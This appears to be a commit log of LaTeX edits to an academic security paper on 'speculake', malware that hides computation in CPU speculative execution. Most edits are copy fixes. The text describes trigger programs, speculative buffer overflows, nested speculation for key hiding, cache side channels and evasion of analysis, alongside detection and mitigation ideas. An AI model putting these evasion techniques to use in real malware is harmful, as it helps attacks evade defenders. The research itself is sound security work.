+Section~\ref{subsec:spec-buffer-overflow}.
 
@@
 
-\paragraph{Single Thread Indirect Branch Predictors} - STIBP prevents sibling
+\paragraph{Single Thread Indirect Branch Predictors}STIBP prevents sibling
 hyperthreads from interacting via the indirect branch predictor. However, this
-does not prevent co-resident processes from cooperating when they run on the same
-logical core.
+does not prevent co-resident processes from cooperating when they run on the
+same logical core.
 
-\paragraph{Indirect Branch Restricted Speculation} - IBRS prevents code in less
+\paragraph{Indirect Branch Restricted Speculation}IBRS prevents code in less
 privileged prediction modes from influencing indirect branch prediction in
@@
 
-\paragraph{Retpoline} is a software mitigation that replaces indirect jumps with
+\paragraph{Retpoline}is a software mitigation that replaces indirect jumps with
 a special call/overflow/return sequence, controlling where the CPU will
@@
 
-When using the cache side channel variant of \speculake, the payload
-program must at least occasionally watch this side channel, offering a
-potential method for detecting \speculake malware.
-Analysts could search for telltale signs of cache inference behavior, such as
-the use of \texttt{clflush} instructions or reading cycle timings. At the cost
-of performance, \speculake could choose to use a more subtle cache side channel
-that does not require this, such as \texttt{Prime+Probe}, or by exploiting race
-conditions between multiple threads to allow the speculative world to influence
-the behavior of the real world.
+When using the cache side channel variant of \speculake, the payload program
+must at least occasionally watch this side channel, offering a potential method
+for detecting \speculake malware. Analysts could search for telltale signs of
+cache inference behavior, such as the use of \texttt{clflush} instructions or
+reading cycle timings. At the cost of performance, \speculake could choose to
+use a more subtle cache side channel that does not require this, such as
+\texttt{Prime+Probe}, or by exploiting race conditions between multiple threads
+to allow the speculative world to influence the behavior of the real world.
 
-\speculake could also use another side channel method that
-avoids the cache
-to exfiltrate information from the speculative gadgets, such as the branch
+\speculake could also use another side channel method that avoids the cache to
+exfiltrate information from the speculative gadgets, such as the branch
 predictor itself~\cite{evtyushkin2018branchscope}, memory bandwidth, power
-utilization, or contention over other shared resources~\cite{kiriansky2018speculative}.
-While cache 
-channels tend to have the highest throughput, they are not the only 
-resource that must be monitored to detect or prevent these types of attacks.
+utilization, or contention over other shared
+resources~\cite{kiriansky2018speculative}. While cache channels tend to have the
+highest throughput, they are not the only resource that must be monitored to
+detect or prevent these types of attacks.
 
@@
 To prevent such identification, analyzers often employ ``bare metal''
-execution~\cite{kirat2011barebox}, running the malware on
-dedicated hardware that allows introspection and observation of the system
-without interfering with its normal operation. This prevents malware from using
-so-called ``red pill'' checks to observe that it is under test (and hide its
-malicious behavior)~\cite{kirat2014barecloud}. However, to the best of our
-knowledge, no publicly available bare-metal environments allow introspection on
-the speculative state of the CPU, making it difficult to analyze \speculake
-malware. However, such environments could be useful for observing the behavior of
+execution~\cite{kirat2011barebox}, running the malware on dedicated hardware
+that allows introspection and observation of the system without interfering with
+its normal operation. This prevents malware from using so-called ``red pill''
+checks to observe that it is under test (and hide its malicious
+behavior)~\cite{kirat2014barecloud}. However, to the best of our knowledge, no
+publicly available bare-metal environments allow introspection on the
+speculative state of the CPU, making it difficult to analyze \speculake malware.
+However, such environments could be useful for observing the behavior of
 \speculake malware in the presence of its trigger if available, as modifications
@@
 hardware, and are best fixed there. However, we note that fixing problems in
-order to prevent Spectre may not necessarily prevent \speculake malware. In Spectre, an application is
-coerced against its will to mis-speculate branches, but in \speculake, the
-application willfully encourages the mis-speculation. Thus, some solutions may
-defend against Spectre, but not \speculake.
+order to prevent Spectre may not necessarily prevent \speculake malware. In
+Spectre, an application is coerced against its will to mis-speculate branches,
+but in \speculake, the application willfully encourages the mis-speculation.
+Thus, some solutions may defend against Spectre, but not \speculake.
 
 One such solution is a new \texttt{specfence} instruction, that prohibits the
-CPU from speculating past. This instruction would require that loads and stores after
-the instruction must wait (and cannot be pre-fetched) until the
+CPU from speculating past. This instruction would require that loads and stores
+after the instruction must wait (and cannot be pre-fetched) until the
 \texttt{specfence} instruction has retired. We note this is distinct from the
@@
 \texttt{rep} prefix for string operations is able to do this if it is set to
-repeat more than 96 times, presumably as it issues $2*96$ $\mu$-ops, and fills the
-ROB~\cite{intel-instruction-tables}.
+repeat more than 96 times, presumably as it issues $2*96$ $\mu$-ops, and fills
+the ROB~\cite{intel-instruction-tables}.
 
@@
 by examining the execution path of the payload program, and locating a common
-indirect jump pattern between payload and potential triggers. Since both programs must
-share a common indirect jump pattern to interact via the indirect branch
-predictor, there must be some overlap which is unlikely to occur randomly
+indirect jump pattern between payload and potential triggers. Since both
+programs must share a common indirect jump pattern to interact via the indirect
+branch predictor, there must be some overlap which is unlikely to occur randomly
 between two programs.
@@
 execution environment, it is possible to have the payload program to combine
-multiple triggers. Instead of requiring only a single trigger program,
-the payload could require multiple trigger programs to be running
-simultaneously, or in a particular order. Alternatively, the payload could combine
-trigger programs with input triggers, forcing an analyst to understand multiple
-variants simulatenously.
+multiple triggers. Instead of requiring only a single trigger program, the
+payload could require multiple trigger programs to be running simultaneously, or
+in a particular order. Alternatively, the payload could combine trigger programs
+with input triggers, forcing an analyst to understand multiple variants
+simultaneously.
 
 This could allow fine-grained targeting of malware. For instance, the attacker
-could distribute trigger programs through different channels to target different sets
-of victims, and have the ultimate payload only operate at the intersection of
-these groups. As an example, one trigger program could be distributed to a
+could distribute trigger programs through different channels to target different
+sets of victims, and have the ultimate payload only operate at the intersection
+of these groups. As an example, one trigger program could be distributed to a
 particular country (e.g. Iran), and another to a particular device globally
@@
 %decryption or more traditional malicious behavior. 
-Using this method a payload
-program can be distributed without the encrypted data section at all,
-instead having the data written into the process indirectly at run-time without ever
-connecting out to any other resource.
+Using this method a payload program can be distributed without the encrypted
+data section at all, instead having the data written into the process indirectly
+at run-time without ever connecting out to any other resource.
 
@@
 We have proposed the \speculake model as a new malware threat, however, this
-model of hidden computation could be applied more broadly. As of now there are no ways of
-debugging speculative computation, meaning that the computation done there is
-effectively isolated and difficult to extract by third-parties, even with
-physical or root access to the machine it operates on. While not a true
+model of hidden computation could be applied more broadly. As of now there are
+no ways of debugging speculative computation, meaning that the computation done
+there is effectively isolated and difficult to extract by third-parties, even
+with physical or root access to the machine it operates on. While not a true
 trusted execution environment, it is possible that such an environment could be

### 2018-08-07 paper/related-work.tex
minor changes

@@
 machines'' include traditional vulnerabilities such as buffer overflows, format
-string exploits and return oriented
-programming~\cite{buffer_overflow, format_string_exploit, shacham2007geometry}.
-Weird machines have also been built using operating system page faults, enabling
-the computation of arithmetic and logic operations without the use of
-traditional instructions~\cite{bangert2013page}.
+string exploits and return oriented programming~\cite{buffer_overflow,
+format_string_exploit, shacham2007geometry}. Weird machines have also been built
+using operating system page faults, enabling the computation of arithmetic and
+logic operations without the use of traditional
+instructions~\cite{bangert2013page}.
 %Additionally, unexpected functionality such as instruction-less computing
@@
 
-Spectre builds upon prior work on cache side channels, and similarly uses to to
-leak information from
+Spectre builds upon prior work on cache side channels, and similarly uses them
+to leak information from
 processes~\cite{percival2005cache,zhang2012cross,osvik2006cache}. In \speculake,
@@
 
-Previous work has examined how to share information over covert
-channels, such as across virtualized environments on cloud
-systems~\cite{wu2012whispers}, using L1 and L2 cache to share
-information~\cite{percival2005cache}, measuring temperature to create a thermal
-covert channel~\cite{masti2015thermal, bartolini2016capacity}, and taking
-advantage of processor architecture to leak information~\cite{wang2006covert}.
-This includes using the branch predictor itself as a covert
+Previous work has examined how to share information over covert channels, such
+as across virtualized environments on cloud systems~\cite{wu2012whispers}, using
+L1 and L2 cache to share information~\cite{percival2005cache}, measuring
+temperature to create a thermal covert channel~\cite{masti2015thermal,
+bartolini2016capacity}, and taking advantage of processor architecture to leak
+information~\cite{wang2006covert}. This includes using the branch predictor
+itself as a covert
 channel~\cite{evtyushkin2016understanding,evtyushkin2015covert}, which

### 2018-08-07 paper/architecture.tex
fix citation
typos

@@
 
-Eventually, the dereference of the uncached function pointer in the payload program
-will be resolved, and the CPU will recognize it has incorrectly predicted the
-destination of its \texttt{callq} instruction. The
-results from the speculative entry point instructions will be discarded, and the
-CPU will continue executing from the correct destination. However, the
-speculative code can change what is loaded into the cache based on its
-computation, allowing it to covertly communicate its results to the ``real world'' program.
+Eventually, the de-reference of the uncached function pointer in the payload
+program will be resolved, and the CPU will recognize it has incorrectly
+predicted the destination of its \texttt{callq} instruction. The results from
+the speculative entry point instructions will be discarded, and the CPU will
+continue executing from the correct destination. However, the speculative code
+can change what is loaded into the cache based on its computation, allowing it
+to covertly communicate its results to the ``real world'' program.
 
@@
 output registers and allows them to use the entire size provided by the ROB, as
-determined in Section~\ref{sssec:ROB}. This includes idomatic no-ops and zero
+determined in Section~\ref{sssec:ROB}. This includes idiomatic no-ops and zero
 idioms, which have no reliance on register values, for example the instruction
@@
 full block using simple AES modes (e.g. AES-CTR). We investigate the use of AES
-instructions in the spculative environment further in
+instructions in the speculative environment further in
 Sections~\ref{subsec:decryption}.
@@
 
-We find that when executing speculatively, the number of instrutions completed
+We find that when executing speculatively, the number of instructions completed
 is rarely limited by cache miss duration. Instead
@@
 but nonetheless support non-nested \speculake. Both Sandy Bridge (which
-preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
+preceded Haswell) and Kaby Lake (which followed Haswell) support nested
 speculation. We find that when a CPU does support nested speculation, there
@@
 
-We summarize our findings into a \emph{speculative primitive}, which allows our payload program to
-speculatively (and covertly) perform on the order of 100 arbitrary
-instructions while an accompanying trigger program is running, and communicate
-a short (e.g. single byte) result to the real
-world via a cache side channel. These speculative instructions are able to read
-from any real-world memory or registers, but they cannot perform updates or
-writes directly. To update memory, the speculative instructions must communicate
-to the real world. We use a cache side channel to do so, but other side channels
-compatible with Spectre could also be used~\cite{spectre1-1}.
+We summarize our findings into a \emph{speculative primitive}, which allows our
+payload program to speculatively (and covertly) perform on the order of 100
+arbitrary instructions while an accompanying trigger program is running, and
+communicate a short (e.g. single byte) result to the real world via a cache side
+channel. These speculative instructions are able to read from any real-world
+memory or registers, but they cannot perform updates or writes directly. To
+update memory, the speculative instructions must communicate to the real world.
+We use a cache side channel to do so, but other side channels compatible with
+Spectre could also be used~\cite{kiriansky2018speculative}.
 
-We note a performance tradeoff between the size of communication (e.g. 4 bits vs 8
-bits) and the time it takes the real world to recover the result from the side
+We note a performance tradeoff between the size of communication (e.g. 4 bits vs
+8 bits) and the time it takes the real world to recover the result from the side
 channel. Using Flush+Reload~\cite{yarom2014flush+} as our cache side channel,
@@
 the size of the result (e.g. $2^8$ array reads to recover an 8-bit result).
-Therefore, there is a
-performance advantage for keeping the size of the result small, and communicating
-out small pieces of information that are aggregated by the real world over multiple speculative executions.
-Meanwhile, smaller channels introduce more overhead in recovering information. We
-investigate this tradeoff in Section~\ref{subsec:impl-aes}, and find that 8~bits
-is near optimal in practice.
+Therefore, there is a performance advantage for keeping the size of the result
+small, and communicating out small pieces of information that are aggregated by
+the real world over multiple speculative executions. Meanwhile, smaller channels
+introduce more overhead in recovering information. We investigate this tradeoff
+in Section~\ref{subsec:impl-aes}, and find that 8~bits is near optimal in
+practice.
 

### 2018-08-07 paper/figures.tex
typos

@@
         \includegraphics[width=1.05\linewidth]{figures/Speculative_measurements_parity.png}
-        \caption{\textbf{Hyperthreading}\,---\,%
-        The trigger program influences the payload program via the indirect branch predictor
-        when running on the same logical CPU core. Hyperthreads also share an indirect branch
-        predictor despite running on different logical cores. We measured the impact of
-        same logical core (warm colors) vs paritiy hyperthreads (cool colors, denoted by (P))
-        on the size of the speculative execution window. As hyperthreads run concurrently, they do not
-        need to wait for an OS context switch between processes, but the two processes directly
-        contend for ROB entries. As a result, we find that hyperthreads generally have a smaller
-        speculative execution window.}
+        \caption{\textbf{Hyperthreading}\,---\,% The trigger program influences
+        the payload program via the indirect branch predictor when running on
+        the same logical CPU core. Hyperthreads also share an indirect branch
+        predictor despite running on different logical cores. We measured the
+        impact of same logical core (warm colors) vs parity hyperthreads (cool
+        colors, denoted by (P)) on the size of the speculative execution window.
+        As hyperthreads run concurrently, they do not need to wait for an OS
+        context switch between processes, but the two processes directly contend
+        for ROB entries. As a result, we find that hyperthreads generally have a
+        smaller speculative execution window.}
     \label{fig:spec-capacity-parity}
@@
         \caption{\textbf{SPASM model}\,---\,%
-        Our SPASM emulator speculatively decrypts intructions, and emulates
+        Our SPASM emulator speculatively decrypts instructions, and emulates
         them in the real world. The \textit{Speculative Computation} decrypts

### 2018-08-07 paper/implementation.tex
typos

@@
 
-The local array store is now the vulnerability it can be exploited even 
-with complete bounds checks. After a series of honest inputs we include 
-an entry with a padding length beyond the maximum. On the runs with this
-cafted input we flush from cache the maximum padding length constant in 
-the payload program, preventing the bounds check from being resolved 
-and allowing the data value to be speculatively stored. We 
-then speculatively overwrite the return address and use store-to-load forwarding
-to cause a following return to divert to the address specified by the data entry. 
-From here we make use of the decryption gadget to dcecrypt SPASM instructions
-from an encrypted data blob to be transmitted to the real world via cache 
-side-channel. Using this method we have been able to run all SPASM payloads 
-including the reverse-shell.
+The local array store is now the vulnerability it can be exploited even with
+complete bounds checks. After a series of honest inputs we include an entry with
+a padding length beyond the maximum. On the runs with this crafted input we
+flush from cache the maximum padding length constant in the payload program,
+preventing the bounds check from being resolved and allowing the data value to
+be speculatively stored. We then speculatively overwrite the return address and
+use store-to-load forwarding to cause a following return to divert to the
+address specified by the data entry. From here we make use of the decryption
+gadget to decrypt SPASM instructions from an encrypted data blob to be
+transmitted to the real world via cache side-channel. Using this method we have
+been able to run all SPASM payloads including the reverse-shell.
 

### 2018-08-07 paper/triggers.tex
typos

@@
 
-To do this, we use Specualtive Buffer Overflows
+To do this, we use Speculative Buffer Overflows
 (SBO)~\cite{kiriansky2018speculative} to redirect control flow to a speculative

### 2018-08-07 paper/discussion.tex
added short reverse engineering section about points-to problem in discussion

@@
 
+Alternatively an analyst may attempt to identify sections of the program or dead 
+code that will be used to access the probe array and thereby find the speculative 
+gadgets. However, identifying sections of memory that will access the probe 
+array is equivalent to the "Must Alias" or "Points-To Problem" which has been 
+proven undecidable without significant 
+restrictions~\cite{ramalingam1994undecidability,landi1992undecidability}.
+
+%
+% Theorem 1. ([7, 10]) Single procedural flow-sensitive points-
+% to analysis with dynamic memory and non-scalar variables
+% is undecidable.
+% Our first result improves the above undecidability result
+% to
+% Theorem 2. Single procedural flow-sensitive points-to
+% analysis with dynamic memory is undecidable, even when
+% only scalar variables are allowed.
+%
+
 \subsection{Future Work}
@@
 be directly extended to other architectures, such as ARM, and other processors
-making use of
-speculative branch prediction.
+making use of speculative branch prediction.
 

### 2018-08-08 paper/architecture.tex
Arch update and shortened to 15 pages

@@
 \section{Architecture}
+\speculake malware is comprised of two independent pieces: a payload program,
+and a trigger. The payload, and some variants of the trigger, must be  installed
+on the victim's computer(e.g. via trojan, remote exploit, or phishing). A running
+payload performs innocuous measurements while waiting for the trigger to
+become present.
 
-\speculake malware is comprised of two independent programs: a payload program,
-and a trigger program. Both are installed on the victim's computer (e.g. via
-trojan, remote exploit, or phishing), and must run simultaneously on the same
-physical CPU. We note that the constraint of running programs on the same CPU is
-not a significant burden: \texttt{taskset} can be used to limit a process to a
-core, or if not available, the attacker can simply run multiple copies of the
-trigger or payload program to coerce the OS scheduler to assign a
-payload/trigger pair to the same core. We note that this is not a strict
-requirement for the attacker as most OS schedulers will use round robin
-algorithms to assign tasks to processors---eventually the trigger and payload
-will execute co-resident on a single core.
+If the trigger is a local program interacting with the payload
+via the indirect branch predictor both programs must run on the same physical CPU. We 
+note that this constraint is not a significant burden as most OS schedulers
+will use round robin algorithms to assign tasks to processors---eventually 
+the trigger and payload will execute co-resident on a single core.
 
@@
 payload program.
+
+If the trigger is an input the program parses innocuous entries waiting 
+for a series of crafted entries to train the direct branch predictor 
+before a specially crafted trigger packet. The payload then forces the CPU
+to speculate by stalling a bounds check. A local array is then speculatively 
+overflowed redirecting program execution speculatively 
+to an address within the payload program specified by the specially 
+crafted trigger packet provided by the attacker.
 
@@
 
-We found that the processor can identify some operations that have no effect on
-output registers and allows them to use the entire size provided by the ROB, as
-determined in Section~\ref{sssec:ROB}. This includes idiomatic no-ops and zero
-idioms, which have no reliance on register values, for example the instruction
-\texttt{xchg \%rax, \%rax} and \texttt{xor \%rax, \%rax}. However, if an
-instruction is a potential data hazard, it must use an entry in the Physical 
-Register File (PRF) until it reaches the correct stage in the execution pipeline. 
-In this case, the number of instructions could be limited by the PRF
-entries available.
-
-%TODO: is this true? Or better explained by the micro-op story?
+% We found that the processor can identify some operations that have no effect on
+% output registers and allows them to use the entire size provided by the ROB, as
+% determined in Section~\ref{sssec:ROB}. This includes idiomatic no-ops and zero
+% idioms, which have no reliance on register values, for example the instruction
+% \texttt{xchg \%rax, \%rax} and \texttt{xor \%rax, \%rax}. However, if an
+% instruction is a potential data hazard, it must use an entry in the Physical 
+% Register File (PRF) until it reaches the correct stage in the execution pipeline. 
+% In this case, the number of instructions could be limited by the PRF
+% entries available.
+% 
+% %TODO: is this true? Or better explained by the micro-op story?
 

### 2018-08-08 paper/discussion.tex
Arch update and shortened to 15 pages

@@
 and flag \speculake malware. We used ClamAV, BitDefender and rkhunter, which
-mainly rely on signature- and string-based detection. BitDefender does feature
+mainly rely on signature and string based detection. BitDefender does feature
 support for unpacking or extracting malware, though appears to simply try
@@
 gadgets. However, identifying sections of memory that will access the probe 
-array is equivalent to the "Must Alias" or "Points-To Problem" which has been 
+array is equivalent to the ``Must Alias'' or ``Points-To Problem'' which has been 
 proven undecidable without significant 
@@
 
-\subsubsection{Alternative Applications}
-We have proposed the \speculake model as a new malware threat, however, this
-model of hidden computation could be applied more broadly. As of now there are
-no ways of debugging speculative computation, meaning that the computation done
-there is effectively isolated and difficult to extract by third-parties, even
-with physical or root access to the machine it operates on. While not a true
-trusted execution environment, it is possible that such an environment could be
-used as a limited trusted environment. This may have potential use in digital
-rights management (DRM), and whitebox cryptography applications.
+% \subsubsection{Alternative Applications}
+% We have proposed the \speculake model as a new malware threat, however, this
+% model of hidden computation could be applied more broadly. As of now there are
+% no ways of debugging speculative computation, meaning that the computation done
+% there is effectively isolated and difficult to extract by third-parties, even
+% with physical or root access to the machine it operates on. While not a true
+% trusted execution environment, it is possible that such an environment could be
+% used as a limited trusted environment. This may have potential use in digital
+% rights management (DRM), and whitebox cryptography applications.
+%
 

### 2018-08-08 paper/conclusion.tex
update conclusion
conclusion pass

@@
 %In this paper 
-We have presented \speculake, a model for hiding computation in
-speculative execution that is fundamentally different than existing methods of
-code obfuscation. Through a series of experiments we have classified the
-capabilities and limitations of this speculative primitive and demonstrated
-various example applications. We have demonstrated the potential
-of using speculative execution in several applications, including a Turing
-machine, SPASM emulator, remotely-triggered payloads, and AES decryption.
-Currently analysis techniques for reverse engineering are insufficient to reason
-about the behavior of these programs.
+We have presented \speculake, a model for hiding computation in speculative
+execution that is fundamentally different than existing methods of code
+obfuscation. Through a series of experiments we have classified the capabilities
+and limitations of this speculative primitive and demonstrated various example
+applications. We have demonstrated the potential of using speculative execution
+in several applications, including a Turing machine, SPASM emulator,
+remotely-triggered payloads, and AES decryption. We have also examined Intel's
+responses to Spectre and Meltdown and noted how their defenses affect \speculake
+and how further variants of Spectre can be adapted to \speculake. Current
+analysis techniques for reverse engineering are insufficient to reason about the
+behavior of these programs.
 
-Given the benefits that speculative execution provides to an attacker and the
-ease of such an attack, the feasibility of an \speculake exploit is high and is
-not limited to data side-channels or process isolation violations, as was
-originally thought in the wake of Spectre. The speculative primitive developed
-in this work not only provides a guarded form of computation, but also enables
-cryptographic protection against current analysis and debugging techniques.
+%Given the benefits that speculative execution provides to an attacker and the
+%ease of such an attack, the feasibility of an \speculake exploit is high and is
+%not limited to data side-channels or process isolation violations, as was
+%originally thought in the wake of Spectre. The speculative primitive developed
+%in this work not only provides a guarded form of computation, but also enables
+%cryptographic protection against current analysis and debugging techniques.
 

### 2018-08-08 paper/architecture.tex
arch pass

@@
 \speculake malware is comprised of two independent pieces: a payload program,
-and a trigger. The payload, and some variants of the trigger, must be  installed
-on the victim's computer(e.g. via trojan, remote exploit, or phishing). A running
-payload performs innocuous measurements while waiting for the trigger to
+and a trigger. The payload, and some form of the trigger, must be installed
+on the victim's computer (e.g. via trojan, remote exploit, or phishing). A running
+payload performs innocuous operations while waiting for the trigger to
 become present.
 
-If the trigger is a local program interacting with the payload
-via the indirect branch predictor both programs must run on the same physical CPU. We 
-note that this constraint is not a significant burden as most OS schedulers
-will use round robin algorithms to assign tasks to processors---eventually 
-the trigger and payload will execute co-resident on a single core.
+One form the trigger can take is another local program that interacts with the
+payload via the indirect branch predictor. In this case, both programs must run
+on the same physical CPU. We note that this constraint is not a significant
+burden, as programs can either use \texttt{taskset}, or, if not available, run
+multiple instances or wait for the OS scheduler to execute both programs on
+the same core.
 
@@
 
-If the trigger is an input the program parses innocuous entries waiting 
-for a series of crafted entries to train the direct branch predictor 
-before a specially crafted trigger packet. The payload then forces the CPU
-to speculate by stalling a bounds check. A local array is then speculatively 
-overflowed redirecting program execution speculatively 
-to an address within the payload program specified by the specially 
-crafted trigger packet provided by the attacker.
+The trigger can also take the form of a special input to the payload program,
+rather than a separate program.
+In this case, the payload program parses input data and performs innocuous
+operations with it. Once the trigger input is provided, it causes the program to
+\emph{speculatively} overflow a buffer, despite correct bounds checks in the program.
+The speculative buffer overflow (described in
+Section~\ref{subsec:spec-buffer-overflow}) causes the program to speculatively
+execute at an address chosen by the trigger input and controlled by the
+attacker.
 
@@
 fuzzers~\cite{afl,stephens2016driller} to generate inputs that explore other
-execution paths of the binary. In contrast, \speculake malware's trigger depends
-on behavior in seemingly unrelated binaries, influencing malware behavior
-through channels that are effectively invisible to the analyst. As with typical
+execution paths of the binary. In contrast, \speculake malware's trigger
+influences behavior of the payload program speculatively, making it effectively
+invisible to the analyst. As with typical
 malware, the analyst may attempt to reverse engineer the trigger to reveal the
 malware's behavior, but we will show (in Section~\ref{subsec:nested-spec}) how
-to defeat this type of analysis.
+this type of analysis can be defeated.
 
@@
 speculative entry point.
+
+In this section, we will describe the trigger program variant, and discuss how
+input data can be used a speculative trigger in
+Section~\ref{sec:spec-buffer-overflow}.
 

### 2018-08-08 paper/architecture.tex
shift disclaimer up

@@
 
+In this subsection, we will describe the trigger program variant, and discuss how
+input data can be used a speculative trigger in
+Section~\ref{subsec:spec-buffer-overflow}.
+
 In \speculake, we cause the CPU to mis-speculate the destination of an indirect
@@
 speculative entry point.
-
-In this section, we will describe the trigger program variant, and discuss how
-input data can be used a speculative trigger in
-Section~\ref{sec:spec-buffer-overflow}.
 

### 2018-08-08 paper/architecture.tex
defer discussiong

--- 2018-08-08 paper/architecture.tex
@@
 
+In this subsection, we will describe the trigger program variant, and defer discussion 
+on how input data can be used a speculative trigger to
+Section~\ref{subsec:spec-buffer-overflow}.
+
 In \speculake, we cause the CPU to mis-speculate the destination of an indirect

### 2018-11-28 paper/figures.tex
added Nested spec Figure and Key for execution figures.

@@
 \newcommand{\FigHighLevel}{
-
 \begin{figure}[ht]
@@
     \label{fig:high-level}
+
+\end{figure}
+}
+
+\newcommand{\FigNestedSpec}{
+\begin{figure}[t]
+    \centering
+    % \includegraphics[clip, trim=6cm 13.5cm 3.8cm 5cm, width=0.9\linewidth]{figures/exspectre-high-level.pdf}
+    \includegraphics[width=0.95\linewidth]{figures/ExSpectre_CR_Nested.png}
+    \caption{\textbf{Nested Speculation}\,---\,%
+    Using nested speculation for obfuscated key derivation. The payload uses 
+    a sequence of indirect jumps controlled by the trigger to incrementally 
+    construct a key exclusively in the speculative environment. Without the 
+    trigger an analyst will need to evaluate every ordering of \textbf{all} indirect 
+    jumps to reconstruct the key. While the \textit{decryption gadget} may be trivial 
+    for an analyst to find, this allows for an encrypted blob in the payload 
+    to remain inaccessible in the absence of the trigger. }
+    \label{fig:nested-spec}
 
@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
+        \includegraphics[width=0.4\textwidth]{figures/ExSpectre_CR_key.png}
         \caption{\textbf{ExSpectre model}\,---\,%

### 2018-11-28 paper/payloads.tex
added Nested spec Figure and Key for execution figures.
add reference to new figure and clarify speculative entry point != speculative key

@@
 
-As a first step, we observe that the speculative primitive can be used to trivially
-implement a finite state machine: logic can be done in the speculative
+As a first step, we observe that the speculative primitive can be used to
+trivially implement a finite state machine: logic can be done in the speculative
 world, while updates to the state are communicated to the real world where they
-are stored. On the next run of the speculative instructions, the state is read from the
-real world state (along with any inputs), state transitions are computed and communicated back.
-In this mode, the state is maintained by the real world,
-while updates are controlled by code executed speculatively.
+are stored. On the next run of the speculative instructions, the state is read
+from the real world state (along with any inputs), state transitions are
+computed and communicated back. In this mode, the state is maintained by the
+real world, while updates are controlled by code executed speculatively.
 
 We further observe we are not limited to finite state machines, but can support
-any model of computation where \emph{updates} to any state are finite (i.e. can fit
-within the bandwidth constraints of the speculative primitive). This
-encompases Turing machines~\cite{turing1937computable} as well as certain random access machines, which we
-investigate next.
-Figure~\ref{fig:general_model} demonstrates the execution flow of a sample \speculake malware.
+any model of computation where \emph{updates} to any state are finite (i.e. can
+fit within the bandwidth constraints of the speculative primitive). This
+encompases Turing machines~\cite{turing1937computable} as well as certain random
+access machines, which we investigate next. Figure~\ref{fig:general_model}
+demonstrates the execution flow of a sample \speculake malware.
 
@@
 To demonstrate that arbitrary computation can be performed cooperatively between
-the speculative world and real world,
-we implement a Turing machine, and configure it to run a 5-state Busy Beaver 
-function~\cite{turing1937computable,chaitin1987computing,herken1992universal}. This configuration allows
-us to run a large number of steps with very minimal logic.
+the speculative world and real world, we implement a Turing machine, and
+configure it to run a 5-state Busy Beaver
+function~\cite{turing1937computable,chaitin1987computing,herken1992universal}.
+This configuration allows us to run a large number of steps with very minimal
+logic.
 %The Busy Beaver is a configuration which writes the most
@@
 However, this toy example is meant only as an illustrative example of arbitrary
-computation, notas a robust means of obfuscation. Indeed, even the initial state
-of a Turing machine alone may reveal a significant amount of information.
+computation, not as a robust means of obfuscation. Indeed, even the initial
+state of a Turing machine alone may reveal a significant amount of information.
 Furthermore, the analyst may attempt to locate potential speculative entry
-points, even without the help of the trigger program. We describe ways to address
-both of these next.
+points, even without the help of the trigger program. We describe ways to
+address both of these next.
 
@@
 We describe our implementation of nested speculative execution in
-Section~\ref{subsec:impl-aes}, where we achieve 128~bits of security.
 %Section~\ref{subsec:nested-spec}.
+Section~\ref{subsec:impl-aes}, where we achieve 128~bits of security. We note
+that the security gained here is not a result of a single entry point
+remaining secret but rather multiple independent jumps by the (unknown) trigger
+program providing numerous landing points for each jump.
+
+\FigNestedSpec
 

### 2018-11-29 paper/paper.tex
add triggers section
fix formatting

@@
 \documentclass[conference]{IEEEtran}
+\pagestyle{plain}
 
@@
 \title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-\author{\IEEEauthorblockN{Anonymized for Review}
+\author{\IEEEauthorblockN{Jack Wampler}
+\IEEEauthorblockA{University of Colorado Boulder\\
+jack.wampler@colorado.edu}
+\and
+\IEEEauthorblockN{Ian Martiny}
+\IEEEauthorblockA{University of Colorado Boulder\\
+ian.martiny@colorado.edu}
+\and
+\IEEEauthorblockN{Eric Wustrow}
+\IEEEauthorblockA{University of Colorado Boulder\\
+ewust@colorado.edu}
 % \IEEEauthorblockA{Georgia Institute of Technology\\
@@
 }
-
 \IEEEoverridecommandlockouts
-\makeatletter\def\@IEEEpubidpullup{9\baselineskip}\makeatother
-\IEEEpubid{\parbox{\columnwidth}{Permission to freely reproduce all or part
-    of this paper for noncommercial purposes is granted provided that
-    copies bear this notice and the full citation on the first
-    page. Reproduction for commercial purposes is strictly prohibited
-    without the prior written consent of the Internet Society, the
-    first-named author (for reproduction of an entire paper only), and
-    the author's employer if the paper was prepared within the scope
-    of employment.
+\makeatletter\def\@IEEEpubidpullup{6.5\baselineskip}\makeatother
+\IEEEpubid{\parbox{\columnwidth}{
+    Network and Distributed Systems Security (NDSS) Symposium 2019\\
+    24-27 February 2019, San Diego, CA, USA\\
+    ISBN 1-891562-55-X\\
+    https://dx.doi.org/10.14722/ndss.2019.23409\\
+    www.ndss-symposium.org
 }
@@
 
+\input{triggers}
+
 \input{implementation.tex}

### 2018-11-30 paper/architecture.tex
add reference to new figure and clarify speculative entry point != speculative key
Added description of arbitrary memory read methodology

@@
 stalled indirect jump while the CPU is already speculating causes it to predict
-the target and
-speculate a second time. For instance, suppose a payload program truly jumps to
-target A, but the CPU is mistrained by a trigger program that jumps to B, thus
-causing the payload program to speculatively execute at B. At B, suppose there
-is a second indirect jump, perhaps using the same register as the first jump
-(which has still not resolved). If the trigger program jumps to C, the payload
-program may speculate a second time and continue speculative execution at~C.
+the target and speculate a second time. For instance, suppose a payload program
+truly jumps to target A, but the CPU is mistrained by a trigger program that
+jumps to B, thus causing the payload program to speculatively execute at B. At
+B, suppose there is a second indirect jump, perhaps using the same register as
+the first jump (which has still not resolved). If the trigger program jumps to
+C, the payload program may speculate a second time and continue speculative
+execution at~C. Figure~\ref{fig:nested-spec} demonstrates Nested Speculation in
+action.
 
@@
 communicate a short (e.g. single byte) result to the real world via a cache side
-channel. These speculative instructions are able to read from any real-world
-memory or registers, but they cannot perform updates or writes directly. To
-update memory, the speculative instructions must communicate to the real world.
-We use a cache side channel to do so, but other side channels compatible with
-Spectre could also be used~\cite{kiriansky2018speculative}.
+channel. These speculative instructions are able to read from any cpu state 
+accessible to the process in the real world including memory and registers, 
+but they cannot perform updates 
+or writes directly. To read memory the \emph{speculative primitive} makes use
+of the ability to bring things into cache. If a load for an uncached memory 
+location is initiated speculatively it will not finish within the speculative 
+window (meaning no value can be exfiltrated to the real world). However, the 
+memory read is not canceled and the value will be available from cache when 
+the processor accesses it speculatively again. To update memory, the speculative 
+instructions must communicate to the real world.  We use a cache side channel 
+to do so, but other side channels compatible with Spectre could also 
+be used~\cite{kiriansky2018speculative}.
 

### 2018-11-30 paper/figures.tex
figure updates
edit on fig 8

@@
         \caption{\textbf{Speculative Bandwidth}\,---\,%
